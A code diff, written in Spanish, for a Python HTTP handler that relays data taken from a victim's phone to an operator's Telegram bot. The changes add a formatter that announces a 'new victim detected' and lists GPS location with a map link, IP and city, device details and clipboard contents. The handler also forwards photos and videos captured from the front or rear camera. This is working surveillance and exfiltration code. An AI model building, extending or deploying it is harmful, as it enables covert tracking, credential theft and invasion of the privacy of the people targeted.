@@ -1,4 +1,4 @@
-import json, os, urllib.request, urllib.parse, base64, io
+import json, os, urllib.request, base64
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler
@@ -39,6 +39,46 @@ def tg_file(token, method, field, filename, mime, filedata, extra={}):
         f"https://api.telegram.org/bot{token}/{method}",
         body, {"Content-Type": "multipart/form-data; boundary=----TGBoundary"})
     return json.loads(urllib.request.urlopen(req, timeout=30).read())
+
+def formato_mensaje(dtype, data):
+    sep = "━━━━━━━━━━━━━━━━"
+    if dtype in ("location", "device_info"):
+        lat = data.get("latitude", "—")
+        lon = data.get("longitude", "—")
+        di = data.get("deviceInfo") or {}
+        ip = data.get("ipInfo") or {}
+        clip = data.get("clipboard", "—")
+        cam = data.get("camera", "")
+        lineas = [f"🎯 Nueva víctima detectada", sep]
+        if lat and lon:
+            lineas += [f"📍 Ubicación",
+                       f"  • Latitud: {lat}",
+                       f"  • Longitud: {lon}",
+                       f"  • Maps: https://maps.google.com/?q={lat},{lon}"]
+        if ip:
+            lineas += [f"🌐 Red",
+                       f"  • IP: {ip.get('ip','—')}",
+                       f"  • Ciudad: {ip.get('city','—')}",
+                       f"  • País: {ip.get('country','—')}",
+                       f"  • Org: {ip.get('org','—')}"]
+        if di:
+            bat = di.get("batteryLevel","—")
+            lineas += [f"📱 Dispositivo",
+                       f"  • Marca: {di.get('brand','—')}",
+                       f"  • Tipo: {di.get('deviceType','—')}",
+                       f"  • Android: {di.get('osVersion','—')}",
+                       f"  • Batería: {bat}",
+                       f"  • Red: {di.get('networkType','—')}",
+                       f"  • Pantalla: {di.get('screenRes','—')}"]
+        if clip and clip != "—":
+            lineas += [f"📋 Portapapeles", f"  {clip}"]
+        return "\n".join(lineas)
+    elif dtype == "clipboard":
+        return f"📋 Portapapeles\n{sep}\n{data if isinstance(data, str) else json.dumps(data)}"
+    else:
+        if isinstance(data, dict):
+            return f"📨 {dtype}\n{sep}\n" + "\n".join(f"  • {k}: {v}" for k, v in data.items())
+        return f"📨 {dtype}: {data}"
 
 class handler(BaseHTTPRequestHandler):
     def reply(self, data, code=200):
@@ -117,24 +157,21 @@ class handler(BaseHTTPRequestHandler):
             dtype = b.get("type", "")
             data = b.get("data")
             camera = b.get("camera", "")
+            cam_es = "Frontal" if camera == "user" else "Trasera"
             try:
                 if dtype == "photo" and data:
                     filedata = base64.b64decode(data)
-                    r = tg_file(tok, "sendPhoto", "photo", "photo.jpg", "image/jpeg",
-                                filedata, {"chat_id": chat, "caption": f"📸 Cámara: {camera}"})
+                    r = tg_file(tok, "sendPhoto", "photo", "foto.jpg", "image/jpeg",
+                                filedata, {"chat_id": chat, "caption": f"📸 Foto — Cámara {cam_es}"})
                     return self.reply({"ok": True, "telegram": r})
                 elif dtype == "video" and data:
                     filedata = base64.b64decode(data)
                     dur = b.get("duration", 0)
                     r = tg_file(tok, "sendVideo", "video", "video.mp4", "video/mp4",
-                                filedata, {"chat_id": chat, "caption": f"🎥 Cámara: {camera} ({dur}s)"})
+                                filedata, {"chat_id": chat, "caption": f"🎥 Video — Cámara {cam_es} ({dur}s)"})
                     return self.reply({"ok": True, "telegram": r})
                 else:
-                    dobj = b.get("data", {})
-                    if isinstance(dobj, dict):
-                        txt = f"📨 {dtype}\n" + "\n".join(f"{k}: {v}" for k, v in dobj.items())
-                    else:
-                        txt = b.get("text") or b.get("message") or str(dobj)
+                    txt = formato_mensaje(dtype, data if data else b.get("data", {}))
                     r = tg(tok, "sendMessage", {"chat_id": chat, "text": txt})
                     return self.reply({"ok": True, "telegram": r})
             except Exception as e:
